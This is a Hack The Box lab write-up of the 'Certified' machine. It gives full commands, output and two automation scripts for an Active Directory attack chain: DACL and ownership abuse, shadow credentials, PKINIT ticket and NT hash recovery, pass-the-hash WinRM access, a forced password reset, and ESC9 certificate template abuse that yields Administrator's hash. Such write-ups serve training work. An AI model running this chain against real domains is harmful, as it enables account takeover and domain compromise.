---
title: Certified
tags:
  - htb
  - windows
  - medium
---
#### Author: lomar

---
# Nmap Scan
```plaintext
# Nmap 7.95 scan initiated Tue Jan 14 10:39:25 2025 as: /usr/lib/nmap/nmap -A -v -oA nmap -T4 10.10.11.41
Nmap scan report for 10.10.11.41
Host is up (0.12s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-14 22:39:46Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Issuer: commonName=certified-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-05-13T15:49:36
| Not valid after:  2025-05-13T15:49:36
| MD5:   4e1f:97f0:7c0a:d0ec:52e1:5f63:ec55:f3bc
|_SHA-1: 28e2:4c68:aa00:dd8b:ee91:564b:33fe:a345:116b:3828
|_ssl-date: 2025-01-14T22:41:14+00:00; +7h00m01s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Issuer: commonName=certified-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-05-13T15:49:36
| Not valid after:  2025-05-13T15:49:36
| MD5:   4e1f:97f0:7c0a:d0ec:52e1:5f63:ec55:f3bc
|_SHA-1: 28e2:4c68:aa00:dd8b:ee91:564b:33fe:a345:116b:3828
|_ssl-date: 2025-01-14T22:41:13+00:00; +7h00m00s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Issuer: commonName=certified-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-05-13T15:49:36
| Not valid after:  2025-05-13T15:49:36
| MD5:   4e1f:97f0:7c0a:d0ec:52e1:5f63:ec55:f3bc
|_SHA-1: 28e2:4c68:aa00:dd8b:ee91:564b:33fe:a345:116b:3828
|_ssl-date: 2025-01-14T22:41:14+00:00; +7h00m01s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-01-14T22:41:13+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Issuer: commonName=certified-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-05-13T15:49:36
| Not valid after:  2025-05-13T15:49:36
| MD5:   4e1f:97f0:7c0a:d0ec:52e1:5f63:ec55:f3bc
|_SHA-1: 28e2:4c68:aa00:dd8b:ee91:564b:33fe:a345:116b:3828
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-01-14T22:40:32
|_  start_date: N/A
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   156.97 ms 10.10.14.1
2   157.07 ms 10.10.11.41

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan 14 10:41:13 2025 -- 1 IP address (1 host up) scanned in 108.61 seconds
```

# Crackmapexec
```bash
┌──(kali㉿kali)-[~/ctfs/certified]
└─$ crackmapexec smb -u judith.mader -p judith09 --shares --users --groups --rid-brute 4000 10.10.11.41
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\judith.mader:judith09 
SMB         10.10.11.41     445    DC01             [+] Enumerated shares
SMB         10.10.11.41     445    DC01             Share           Permissions     Remark
SMB         10.10.11.41     445    DC01             -----           -----------     ------
SMB         10.10.11.41     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.41     445    DC01             C$                              Default share
SMB         10.10.11.41     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.41     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.41     445    DC01             SYSVOL          READ            Logon server share 
SMB         10.10.11.41     445    DC01             [+] Enumerated domain user(s)
SMB         10.10.11.41     445    DC01             certified.htb\gregory.cameron                badpwdcount: 1 desc: 
SMB         10.10.11.41     445    DC01             certified.htb\harry.wilson                   badpwdcount: 1 desc: 
SMB         10.10.11.41     445    DC01             certified.htb\alexander.huges                badpwdcount: 1 desc: 
SMB         10.10.11.41     445    DC01             certified.htb\ca_operator                    badpwdcount: 0 desc: 
SMB         10.10.11.41     445    DC01             certified.htb\management_svc                 badpwdcount: 0 desc: 
SMB         10.10.11.41     445    DC01             certified.htb\judith.mader                   badpwdcount: 0 desc: 
SMB         10.10.11.41     445    DC01             certified.htb\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
SMB         10.10.11.41     445    DC01             certified.htb\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
SMB         10.10.11.41     445    DC01             certified.htb\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain
SMB         10.10.11.41     445    DC01             [+] Enumerated domain group(s)
SMB         10.10.11.41     445    DC01             Management                               membercount: 1
SMB         10.10.11.41     445    DC01             DnsUpdateProxy                           membercount: 0
SMB         10.10.11.41     445    DC01             DnsAdmins                                membercount: 0
SMB         10.10.11.41     445    DC01             Enterprise Key Admins                    membercount: 0
SMB         10.10.11.41     445    DC01             Key Admins                               membercount: 0
SMB         10.10.11.41     445    DC01             Protected Users                          membercount: 0
SMB         10.10.11.41     445    DC01             Cloneable Domain Controllers             membercount: 0
SMB         10.10.11.41     445    DC01             Enterprise Read-only Domain Controllers  membercount: 0
SMB         10.10.11.41     445    DC01             Read-only Domain Controllers             membercount: 0
SMB         10.10.11.41     445    DC01             Denied RODC Password Replication Group   membercount: 8
SMB         10.10.11.41     445    DC01             Allowed RODC Password Replication Group  membercount: 0
SMB         10.10.11.41     445    DC01             Terminal Server License Servers          membercount: 0
SMB         10.10.11.41     445    DC01             Windows Authorization Access Group       membercount: 1
SMB         10.10.11.41     445    DC01             Incoming Forest Trust Builders           membercount: 0
SMB         10.10.11.41     445    DC01             Pre-Windows 2000 Compatible Access       membercount: 2
SMB         10.10.11.41     445    DC01             Account Operators                        membercount: 0
SMB         10.10.11.41     445    DC01             Server Operators                         membercount: 0
SMB         10.10.11.41     445    DC01             RAS and IAS Servers                      membercount: 0
SMB         10.10.11.41     445    DC01             Group Policy Creator Owners              membercount: 1
SMB         10.10.11.41     445    DC01             Domain Guests                            membercount: 0
SMB         10.10.11.41     445    DC01             Domain Users                             membercount: 0
SMB         10.10.11.41     445    DC01             Domain Admins                            membercount: 1
SMB         10.10.11.41     445    DC01             Cert Publishers                          membercount: 1
SMB         10.10.11.41     445    DC01             Enterprise Admins                        membercount: 1
SMB         10.10.11.41     445    DC01             Schema Admins                            membercount: 1
SMB         10.10.11.41     445    DC01             Domain Controllers                       membercount: 0
SMB         10.10.11.41     445    DC01             Domain Computers                         membercount: 0
SMB         10.10.11.41     445    DC01             Storage Replica Administrators           membercount: 0
SMB         10.10.11.41     445    DC01             Remote Management Users                  membercount: 1
SMB         10.10.11.41     445    DC01             Access Control Assistance Operators      membercount: 0
SMB         10.10.11.41     445    DC01             Hyper-V Administrators                   membercount: 0
SMB         10.10.11.41     445    DC01             RDS Management Servers                   membercount: 0
SMB         10.10.11.41     445    DC01             RDS Endpoint Servers                     membercount: 0
SMB         10.10.11.41     445    DC01             RDS Remote Access Servers                membercount: 0
SMB         10.10.11.41     445    DC01             Certificate Service DCOM Access          membercount: 1
SMB         10.10.11.41     445    DC01             Event Log Readers                        membercount: 0
SMB         10.10.11.41     445    DC01             Cryptographic Operators                  membercount: 0
SMB         10.10.11.41     445    DC01             IIS_IUSRS                                membercount: 0
SMB         10.10.11.41     445    DC01             Distributed COM Users                    membercount: 0
SMB         10.10.11.41     445    DC01             Performance Log Users                    membercount: 0
SMB         10.10.11.41     445    DC01             Performance Monitor Users                membercount: 0
SMB         10.10.11.41     445    DC01             Network Configuration Operators          membercount: 0
SMB         10.10.11.41     445    DC01             Remote Desktop Users                     membercount: 0
SMB         10.10.11.41     445    DC01             Replicator                               membercount: 0
SMB         10.10.11.41     445    DC01             Backup Operators                         membercount: 0
SMB         10.10.11.41     445    DC01             Print Operators                          membercount: 0
SMB         10.10.11.41     445    DC01             Guests                                   membercount: 2
SMB         10.10.11.41     445    DC01             Users                                    membercount: 3
SMB         10.10.11.41     445    DC01             Administrators                           membercount: 3
SMB         10.10.11.41     445    DC01             [+] Brute forcing RIDs
SMB         10.10.11.41     445    DC01             498: CERTIFIED\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.41     445    DC01             500: CERTIFIED\Administrator (SidTypeUser)
SMB         10.10.11.41     445    DC01             501: CERTIFIED\Guest (SidTypeUser)
SMB         10.10.11.41     445    DC01             502: CERTIFIED\krbtgt (SidTypeUser)
SMB         10.10.11.41     445    DC01             512: CERTIFIED\Domain Admins (SidTypeGroup)
SMB         10.10.11.41     445    DC01             513: CERTIFIED\Domain Users (SidTypeGroup)
SMB         10.10.11.41     445    DC01             514: CERTIFIED\Domain Guests (SidTypeGroup)
SMB         10.10.11.41     445    DC01             515: CERTIFIED\Domain Computers (SidTypeGroup)
SMB         10.10.11.41     445    DC01             516: CERTIFIED\Domain Controllers (SidTypeGroup)
SMB         10.10.11.41     445    DC01             517: CERTIFIED\Cert Publishers (SidTypeAlias)
SMB         10.10.11.41     445    DC01             518: CERTIFIED\Schema Admins (SidTypeGroup)
SMB         10.10.11.41     445    DC01             519: CERTIFIED\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.41     445    DC01             520: CERTIFIED\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.41     445    DC01             521: CERTIFIED\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.41     445    DC01             522: CERTIFIED\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.41     445    DC01             525: CERTIFIED\Protected Users (SidTypeGroup)
SMB         10.10.11.41     445    DC01             526: CERTIFIED\Key Admins (SidTypeGroup)
SMB         10.10.11.41     445    DC01             527: CERTIFIED\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.41     445    DC01             553: CERTIFIED\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.41     445    DC01             571: CERTIFIED\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.41     445    DC01             572: CERTIFIED\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.41     445    DC01             1000: CERTIFIED\DC01$ (SidTypeUser)
SMB         10.10.11.41     445    DC01             1101: CERTIFIED\DnsAdmins (SidTypeAlias)
SMB         10.10.11.41     445    DC01             1102: CERTIFIED\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.41     445    DC01             1103: CERTIFIED\judith.mader (SidTypeUser)
SMB         10.10.11.41     445    DC01             1104: CERTIFIED\Management (SidTypeGroup)
SMB         10.10.11.41     445    DC01             1105: CERTIFIED\management_svc (SidTypeUser)
SMB         10.10.11.41     445    DC01             1106: CERTIFIED\ca_operator (SidTypeUser)
SMB         10.10.11.41     445    DC01             1601: CERTIFIED\alexander.huges (SidTypeUser)
SMB         10.10.11.41     445    DC01             1602: CERTIFIED\harry.wilson (SidTypeUser)
SMB         10.10.11.41     445    DC01             1603: CERTIFIED\gregory.cameron (SidTypeUser)
```

## Bloodhound
You can use both `nxc` or `bloodhound-python` tools to gather bloodhound data.
### NXC

```bash
nxc ldap 10.10.11.41 -u judith.mader -p judith09 --bloodhound --collection All --dns-tcp --dns-server 10.10.11.41
```

### bloodhound-python
```bash
bloodhound-python -u judith.mader -p 'judith09' -c All -d certified.htb -ns 10.10.11.41       
```

![[/static/certified/20250115112521.png]]

![[/static/certified/20250115112528.png]]
![[/static/certified/20250115112538.png]]

![[/static/certified/20250115112544.png]]

# Getting Ownership
```bash
impacket-owneredit -action write -new-owner judith.mader -target-dn 'CN=Management, CN=Users, DC=CERTIFIED, DC=HTB' 'certified.htb'/'judith.mader':'judith09' -dc-ip 10.10.11.41
```

```bash
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=Management,CN=Users,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09' -dc-ip 10.10.11.41
```

# Adding GroupMember
Add  `judith.mader` to `Management` group.
```bash
bloodyAD  -u 'judith.mader' -p 'judith09' -d 'CERTIFIED.HTB' --host 10.10.11.41 --dns 10.10.11.41 add groupMember 'Management' 'judith.mader'
```

Now we have `GenericWrite` permissions for `MANAGEMENT_SVC`
![[/static/certified/20250115131602.png]]
# Adding Shadow Credidentals
If you check Bloodhound, you can do `Shadow Credentials attack` using `GenericWrite` permission. To do this, we will use [`pywhisker`](https://github.com/ShutdownRepo/pywhisker) tool.
```bash
pywhisker -t 'MANAGEMENT_SVC' -a add --dc-ip 10.10.11.41 -d 'CERTIFIED.HTB' -u 'judith.mader' -p 'judith09'
```
# Getting TGT of `MANAGEMENT_SVC`
In this phase we will use [`PKINITTolls`](https://github.com/dirkjanm/PKINITtools) to get `TGT` using `.pfx` certificate.
```bash                                                                        
gettgtpkinit -cert-pfx JRhUKp3E.pfx -pfx-pass 2uGi7GqwG1gGMbKj43Xr -dc-ip 10.10.11.41 'CERTIFIED.HTB/MANAGEMENT_SVC' fuck.ccache
2025-01-15 05:42:17,507 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-01-15 05:42:17,516 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
Traceback (most recent call last):
  File "/opt/PKINITtools/gettgtpkinit.py", line 349, in <module>
    main()
  File "/opt/PKINITtools/gettgtpkinit.py", line 345, in main
    amain(args)
  File "/opt/PKINITtools/gettgtpkinit.py", line 315, in amain
    res = sock.sendrecv(req)
          ^^^^^^^^^^^^^^^^^^
  File "/opt/PKINITtools/venv/lib/python3.12/site-packages/minikerberos/network/clientsocket.py", line 85, in sendrecv
    raise KerberosError(krb_message)
minikerberos.protocol.errors.KerberosError:  Error Name: KRB_AP_ERR_SKEW Detail: "The clock skew is too great" 
```
so we have to sync clock to `certified.htb`
```bash
sudo ntpdate certified.htb
```
re-run the `gettgtpkinit` command again.
```bash
gettgtpkinit -cert-pfx JRhUKp3E.pfx -pfx-pass 2uGi7GqwG1gGMbKj43Xr -dc-ip 10.10.11.41 'CERTIFIED.HTB/MANAGEMENT_SVC' fuck.ccache
2025-01-15 12:45:01,794 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-01-15 12:45:01,803 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-01-15 12:45:29,734 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-01-15 12:45:29,734 minikerberos INFO     KERBEROS_KEY
INFO:minikerberos:KERBEROS_KEY
2025-01-15 12:45:29,739 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```
We got the  `TGT` ticket.
# Getting NT Hash Of `MANAGEMENT_SVC`
```bash
┌──(kali㉿kali)-[~/ctfs/certified]
└─$ getnthash -key KERBEROS_KEY -dc-ip 10.10.11.41 'CERTIFIED.HTB/MANAGEMENT_SVC'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
MANAGEMENT_HASH
```

```bash
┌──(kali㉿kali)-[~/ctfs/certified]
└─$ evil-winrm -i 10.10.11.41 -u 'MANAGEMENT_SVC' -H MANAGEMENT_HASH
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\management_svc\Documents> dir ../Desktop


    Directory: C:\Users\management_svc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/15/2025   3:02 AM             34 user.txt

*Evil-WinRM* PS C:\Users\management_svc\Documents> type ../Desktop/user.txt
USER_FLAG
*Evil-WinRM* PS C:\Users\management_svc\Documents> 

```

# Changing Password Of `CA_OPERATOR`
![[/static/certified/20250115135202.png]]
```bash
bloodyAD --host '10.10.11.41' -d 'CERTIFIED.HTB' -u 'MANAGEMENT_SVC' -p ':MANAGEMENT_HASH' set password 'CA_OPERATOR' 'P@$sWoRd123!'
```

## Scripting Phases
First script, getting `.pfx` file
```
#!/bin/bash
target_ip=$1

impacket-owneredit -action write -new-owner judith.mader -target-dn 'CN=Management, CN=Users, DC=CERTIFIED, DC=HTB' 'certified.htb'/'judith.mader':'judith09' -dc-ip $target_ip
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=Management,CN=Users,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09' -dc-ip $target_ip
bloodyAD  -u 'judith.mader' -p 'judith09' -d 'CERTIFIED.HTB' --host $target_ip --dns $target_ip add groupMember 'Management' 'judith.mader'
pywhisker -t 'MANAGEMENT_SVC' -a add --dc-ip $target_ip -d 'CERTIFIED.HTB' -u 'judith.mader' -p 'judith09'

```
Second script, changing password of `CA_OPERATOR`
```bash
#!/bin/bash

target_ip=$1
pfx_file=$2
pfx_pass=$3
new_password=$4
export KRB5CCNAME=fuck.ccache
sudo ntpdate certified.htb
gettgtpkinit -cert-pfx $pfx_file -pfx-pass $pfx_pass -dc-ip $target_ip 'CERTIFIED.HTB/MANAGEMENT_SVC' fuck.ccache
read -p 'KEY=' KEY
getnthash -key $KEY -dc-ip $target_ip 'CERTIFIED.HTB/MANAGEMENT_SVC'
read -p 'NT_HASH=' NT_HASH
bloodyAD --host $target_ip -d 'CERTIFIED.HTB' -u 'MANAGEMENT_SVC' -p ":$NT_HASH" set password 'CA_OPERATOR' $new_password

```
# Certificate Template Abuse

Scanning for vulnerable certificate tempaltes using `certipy`
```bash
certipy-ad find -stdout -dc-ip 10.10.11.41 -ns 10.10.11.41 -dns-tcp -u CA_OPERATOR@CERTIFIED.HTB -p P@$sWoRd123! -vulnerable
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'certified-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'certified-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'certified-DC01-CA' via RRP
[*] Got CA configuration for 'certified-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCertificates              : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectAltRequireUpn
    Enrollment Flag                     : NoSecurityExtension
                                          AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Property Principals       : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
    [!] Vulnerabilities
      ESC9                              : 'CERTIFIED.HTB\\operator ca' can enroll and template has no security extension
```

`CertifiedAuthentication` certificate template is vulnerable [ESC9](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension). We will change the principal of `ca_operator` to `administrator`
```bash
certipy-ad account update -u management_svc@certified.htb -hashes $NT_HASH -user ca_operator -upn administrator -dns-tcp
```

Then request certificate of `administrator`
```bash
certipy-ad req -u ca_operator@certified.htb -p $new_password -ca certified-DC01-CA -template CertifiedAuthentication -upn administrator -debug -dc-ip $target_ip-ns $target_ip
```

After requestes `administrator.pfx` change the principal of `ca_operator` to original
```bash
certipy-ad account update -u management_svc@certified.htb -hashes MANAGEMENT_HASH -user ca_operator -upn ca_operator -dns-tcp
```

Request the `administrator` user's `NT:LM` hash
```bash
certipy-ad auth -pfx administrator.pfx -domain certified.htb
```

Done! You can login to `administrator`

```bash
evil-winrm -i $target_ip -u Administrator -H ADMINISTRATOR_HASH
```
# References
https://github.com/ShutdownRepo/pywhisker
https://www.hackingarticles.in/abusing-ad-dacl-writeowner/
https://github.com/dirkjanm/PKINITtools
https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword